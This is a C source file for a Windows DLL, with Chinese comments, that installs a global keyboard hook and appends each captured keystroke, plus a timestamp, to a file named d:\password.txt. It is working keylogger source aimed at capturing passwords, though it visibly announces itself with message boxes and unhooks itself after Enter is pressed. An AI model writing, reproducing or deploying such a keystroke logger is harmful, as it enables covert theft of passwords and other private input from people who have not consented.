#define  _CRT_SECURE_NO_WARNINGS
#include "hook.h"
//保持对当前线程实例的一个引用
HINSTANCE HInstance = NULL;
#pragma data_seg("hook")
HHOOK currentHook = NULL;
#pragma data_seg()
DLL_EXPORT void initHook();
DLL_EXPORT LRESULT CALLBACK hookCallback(
	_In_ int    nCode,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
);
DLL_EXPORT void endHook();



BOOL WINAPI DllMain(
	_In_ HINSTANCE hinstDLL,
	_In_ DWORD     fdwReason,
	_In_ LPVOID    lpvReserved
) {
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		HInstance = hinstDLL;
		break;
	case DLL_PROCESS_DETACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	default:
		break;
	}
	return TRUE;
}
void outputTime() {
	FILE *file = NULL;
	file = fopen("d:\\password.txt", "a");
	
	time_t currentTime = NULL;
	currentTime = time(NULL);
	struct tm *tmTime;
	tmTime = localtime(&currentTime);

	char *format = "%Y-%m-%d %H:%M:%S";
	char strTime[30] = { 0 };

	strftime(strTime,30,format,tmTime);

	fprintf(file, "\n%s\n", strTime);
	fclose(file);
}
DLL_EXPORT void initHook() {
	currentHook = SetWindowsHookEx(WH_KEYBOARD,hookCallback,HInstance,0);
	if (currentHook == NULL)
	{
		MessageBoxA(0, "键盘钩子安装失败", "提示", 0);
	}
	else {
		MessageBoxA(0, "键盘钩子安装成功", "提示", 0);
		outputTime();
		MSG msg;
		while (GetMessage(&msg, 0, 0, 0))
		{
			TranslateMessage(&msg);
			DispatchMessageW(&msg);
		}
	}
	//在非MFC程序中,由于不能自动处理消息分发,需要自己手动分发
}


LRESULT CALLBACK hookCallback(
	_In_ int    nCode,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
) {
	if (nCode < 0)
	{
		//如果code小于0，必须调用CallNextHookEx传递消息，不处理该消息，并返回CallNextHookEx的返回值。  
		return CallNextHookEx(currentHook, nCode, wParam, lParam);
	}

	if (nCode == HC_ACTION && lParam > 0)
	{
		//code等于HC_ACTION，表示消息中包含按键消息  
		//如果为WM_KEYDOWN，则显示按键对应的文本  
		char szBuf[MAXBYTE] = { 0 };
		//该函数可以根据lParam中的不同位提取出本次按键数据,与wParam内容相同
		GetKeyNameTextA(lParam, szBuf, MAXBYTE);
		printf("%c,%d,%s\n",wParam,lParam,szBuf);
		FILE *file = NULL;
		file = fopen("d:\\password.txt","a");
		fprintf(file,"%c ",wParam);
		fclose(file);
		if (wParam == VK_RETURN)
		{
			endHook();
		}
	}

	return CallNextHookEx(currentHook,nCode,wParam,lParam);
}

DLL_EXPORT void endHook()
{
	UnhookWindowsHookEx(currentHook);
	MessageBoxA(0, "卸载成功", "提示", 0);
}
